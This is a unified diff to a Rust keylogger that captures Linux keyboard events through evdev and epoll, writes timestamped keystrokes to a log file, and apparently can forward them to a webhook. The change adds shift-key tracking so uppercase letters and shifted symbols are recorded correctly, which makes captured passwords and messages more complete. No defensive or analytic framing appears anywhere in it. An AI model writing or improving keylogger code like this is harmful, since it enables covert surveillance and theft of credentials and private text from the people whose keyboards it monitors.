@@ -228,6 +228,9 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
     }
 
     let mut events = [EpollEvent::empty(); 10];
+    
+    // Track shift key state (true when shift is pressed)
+    let mut shift_pressed = false;
 
     // Main event loop
     loop {
@@ -245,9 +248,22 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
                                 for ev in event_iter {
                                     if ev.event_type() == EventType::KEY {
                                         if let InputEventKind::Key(key) = ev.kind() {
+                                            // Track shift key state
+                                            if key == Key::KEY_LEFTSHIFT || key == Key::KEY_RIGHTSHIFT {
+                                                if ev.value() == 1 {
+                                                    // Shift pressed
+                                                    shift_pressed = true;
+                                                } else if ev.value() == 0 {
+                                                    // Shift released
+                                                    shift_pressed = false;
+                                                }
+                                                // Don't log shift key itself
+                                                continue;
+                                            }
+                                            
                                             // Only log key press events (value == 1), not releases (value == 0) or repeats (value == 2)
                                             if ev.value() == 1 {
-                                                let key_str = format_key(key);
+                                                let key_str = format_key(key, shift_pressed);
                                                 let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S%.3f");
                                                 
                                                 let log_entry = format!(
@@ -294,47 +310,47 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
     let _ = unistd::close(epoll_fd);
 }
 
-fn format_key(key: Key) -> String {
+fn format_key(key: Key, shift_pressed: bool) -> String {
     match key {
-        // Letters
-        Key::KEY_A => "a".to_string(),
-        Key::KEY_B => "b".to_string(),
-        Key::KEY_C => "c".to_string(),
-        Key::KEY_D => "d".to_string(),
-        Key::KEY_E => "e".to_string(),
-        Key::KEY_F => "f".to_string(),
-        Key::KEY_G => "g".to_string(),
-        Key::KEY_H => "h".to_string(),
-        Key::KEY_I => "i".to_string(),
-        Key::KEY_J => "j".to_string(),
-        Key::KEY_K => "k".to_string(),
-        Key::KEY_L => "l".to_string(),
-        Key::KEY_M => "m".to_string(),
-        Key::KEY_N => "n".to_string(),
-        Key::KEY_O => "o".to_string(),
-        Key::KEY_P => "p".to_string(),
-        Key::KEY_Q => "q".to_string(),
-        Key::KEY_R => "r".to_string(),
-        Key::KEY_S => "s".to_string(),
-        Key::KEY_T => "t".to_string(),
-        Key::KEY_U => "u".to_string(),
-        Key::KEY_V => "v".to_string(),
-        Key::KEY_W => "w".to_string(),
-        Key::KEY_X => "x".to_string(),
-        Key::KEY_Y => "y".to_string(),
-        Key::KEY_Z => "z".to_string(),
+        // Letters - uppercase when shift is pressed
+        Key::KEY_A => if shift_pressed { "A" } else { "a" }.to_string(),
+        Key::KEY_B => if shift_pressed { "B" } else { "b" }.to_string(),
+        Key::KEY_C => if shift_pressed { "C" } else { "c" }.to_string(),
+        Key::KEY_D => if shift_pressed { "D" } else { "d" }.to_string(),
+        Key::KEY_E => if shift_pressed { "E" } else { "e" }.to_string(),
+        Key::KEY_F => if shift_pressed { "F" } else { "f" }.to_string(),
+        Key::KEY_G => if shift_pressed { "G" } else { "g" }.to_string(),
+        Key::KEY_H => if shift_pressed { "H" } else { "h" }.to_string(),
+        Key::KEY_I => if shift_pressed { "I" } else { "i" }.to_string(),
+        Key::KEY_J => if shift_pressed { "J" } else { "j" }.to_string(),
+        Key::KEY_K => if shift_pressed { "K" } else { "k" }.to_string(),
+        Key::KEY_L => if shift_pressed { "L" } else { "l" }.to_string(),
+        Key::KEY_M => if shift_pressed { "M" } else { "m" }.to_string(),
+        Key::KEY_N => if shift_pressed { "N" } else { "n" }.to_string(),
+        Key::KEY_O => if shift_pressed { "O" } else { "o" }.to_string(),
+        Key::KEY_P => if shift_pressed { "P" } else { "p" }.to_string(),
+        Key::KEY_Q => if shift_pressed { "Q" } else { "q" }.to_string(),
+        Key::KEY_R => if shift_pressed { "R" } else { "r" }.to_string(),
+        Key::KEY_S => if shift_pressed { "S" } else { "s" }.to_string(),
+        Key::KEY_T => if shift_pressed { "T" } else { "t" }.to_string(),
+        Key::KEY_U => if shift_pressed { "U" } else { "u" }.to_string(),
+        Key::KEY_V => if shift_pressed { "V" } else { "v" }.to_string(),
+        Key::KEY_W => if shift_pressed { "W" } else { "w" }.to_string(),
+        Key::KEY_X => if shift_pressed { "X" } else { "x" }.to_string(),
+        Key::KEY_Y => if shift_pressed { "Y" } else { "y" }.to_string(),
+        Key::KEY_Z => if shift_pressed { "Z" } else { "z" }.to_string(),
 
-        // Numbers
-        Key::KEY_0 => "0".to_string(),
-        Key::KEY_1 => "1".to_string(),
-        Key::KEY_2 => "2".to_string(),
-        Key::KEY_3 => "3".to_string(),
-        Key::KEY_4 => "4".to_string(),
-        Key::KEY_5 => "5".to_string(),
-        Key::KEY_6 => "6".to_string(),
-        Key::KEY_7 => "7".to_string(),
-        Key::KEY_8 => "8".to_string(),
-        Key::KEY_9 => "9".to_string(),
+        // Numbers - show symbols when shift is pressed (US keyboard layout)
+        Key::KEY_0 => if shift_pressed { ")" } else { "0" }.to_string(),
+        Key::KEY_1 => if shift_pressed { "!" } else { "1" }.to_string(),
+        Key::KEY_2 => if shift_pressed { "@" } else { "2" }.to_string(),
+        Key::KEY_3 => if shift_pressed { "#" } else { "3" }.to_string(),
+        Key::KEY_4 => if shift_pressed { "$" } else { "4" }.to_string(),
+        Key::KEY_5 => if shift_pressed { "%" } else { "5" }.to_string(),
+        Key::KEY_6 => if shift_pressed { "^" } else { "6" }.to_string(),
+        Key::KEY_7 => if shift_pressed { "&" } else { "7" }.to_string(),
+        Key::KEY_8 => if shift_pressed { "*" } else { "8" }.to_string(),
+        Key::KEY_9 => if shift_pressed { "(" } else { "9" }.to_string(),
 
         // Special keys
         Key::KEY_SPACE => " ".to_string(),
@@ -342,24 +358,23 @@ fn format_key(key: Key) -> String {
         Key::KEY_TAB => "\t[TAB]".to_string(),
         Key::KEY_BACKSPACE => "[BACKSPACE]".to_string(),
         Key::KEY_ESC => "[ESC]".to_string(),
-        Key::KEY_LEFTSHIFT | Key::KEY_RIGHTSHIFT => "[SHIFT]".to_string(),
         Key::KEY_LEFTCTRL | Key::KEY_RIGHTCTRL => "[CTRL]".to_string(),
         Key::KEY_LEFTALT | Key::KEY_RIGHTALT => "[ALT]".to_string(),
         Key::KEY_LEFTMETA | Key::KEY_RIGHTMETA => "[META]".to_string(),
         Key::KEY_CAPSLOCK => "[CAPSLOCK]".to_string(),
         
-        // Punctuation
-        Key::KEY_COMMA => ",".to_string(),
-        Key::KEY_DOT => ".".to_string(),
-        Key::KEY_SLASH => "/".to_string(),
-        Key::KEY_SEMICOLON => ";".to_string(),
-        Key::KEY_APOSTROPHE => "'".to_string(),
-        Key::KEY_LEFTBRACE => "[".to_string(),
-        Key::KEY_RIGHTBRACE => "]".to_string(),
-        Key::KEY_BACKSLASH => "\\".to_string(),
-        Key::KEY_MINUS => "-".to_string(),
-        Key::KEY_EQUAL => "=".to_string(),
-        Key::KEY_GRAVE => "`".to_string(),
+        // Punctuation - show shifted version when shift is pressed
+        Key::KEY_COMMA => if shift_pressed { "<" } else { "," }.to_string(),
+        Key::KEY_DOT => if shift_pressed { ">" } else { "." }.to_string(),
+        Key::KEY_SLASH => if shift_pressed { "?" } else { "/" }.to_string(),
+        Key::KEY_SEMICOLON => if shift_pressed { ":" } else { ";" }.to_string(),
+        Key::KEY_APOSTROPHE => if shift_pressed { "\"" } else { "'" }.to_string(),
+        Key::KEY_LEFTBRACE => if shift_pressed { "{" } else { "[" }.to_string(),
+        Key::KEY_RIGHTBRACE => if shift_pressed { "}" } else { "]" }.to_string(),
+        Key::KEY_BACKSLASH => if shift_pressed { "|" } else { "\\" }.to_string(),
+        Key::KEY_MINUS => if shift_pressed { "_" } else { "-" }.to_string(),
+        Key::KEY_EQUAL => if shift_pressed { "+" } else { "=" }.to_string(),
+        Key::KEY_GRAVE => if shift_pressed { "~" } else { "`" }.to_string(),
 
         // Arrow keys
         Key::KEY_UP => "[UP]".to_string(),
@@ -388,6 +403,9 @@ fn format_key(key: Key) -> String {
         Key::KEY_END => "[END]".to_string(),
         Key::KEY_PAGEUP => "[PAGEUP]".to_string(),
         Key::KEY_PAGEDOWN => "[PAGEDOWN]".to_string(),
+
+        // Shift keys should never reach here as they're filtered out
+        Key::KEY_LEFTSHIFT | Key::KEY_RIGHTSHIFT => "".to_string(),
 
         // Default for unmapped keys
         _ => format!("[{:?}]", key),
